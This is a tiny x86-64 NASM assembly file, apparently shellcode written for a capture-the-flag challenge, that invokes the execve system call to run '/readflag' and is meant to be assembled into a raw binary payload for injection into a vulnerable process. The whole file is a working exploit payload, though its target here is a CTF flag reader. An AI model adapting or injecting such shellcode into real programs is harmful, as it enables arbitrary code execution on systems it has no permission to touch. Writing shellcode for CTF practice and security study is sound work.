    BITS 64
    DEFAULT REL

    section .text
    global _start

; nasm -f bin shellcode.asm -o shellcode.bin
_start:
    lea rdi, [bin]
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 0x3b
    syscall

bin: db "/readflag", 0